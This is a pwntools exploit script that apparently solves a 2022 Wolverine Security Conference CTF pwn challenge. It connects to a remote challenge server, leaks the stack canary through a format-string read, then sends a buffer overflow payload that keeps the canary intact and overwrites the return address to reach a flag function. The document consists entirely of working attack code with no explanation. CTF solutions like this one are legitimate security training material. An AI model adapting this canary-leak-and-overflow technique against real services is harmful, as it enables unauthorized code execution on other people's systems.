# wolverine security conference CTF 2022
# https://ctftime.org/event/1612

from pwn import *
context.log_level='debug'

p = remote("107.191.51.129", 5001)
#p = process("./string0")

flag = p32(int(b"0x0804920F", 16))
c_buffer = b"A"*16
buf = b"A"*12

p.recvuntil("format string?\n")
p.sendline(b"%11$p")
canary = p32(int(p.recvuntil("\n"),16))

p.recvuntil("overflow?\n")
p.sendline(c_buffer + canary + buf + flag)

p.interactive()
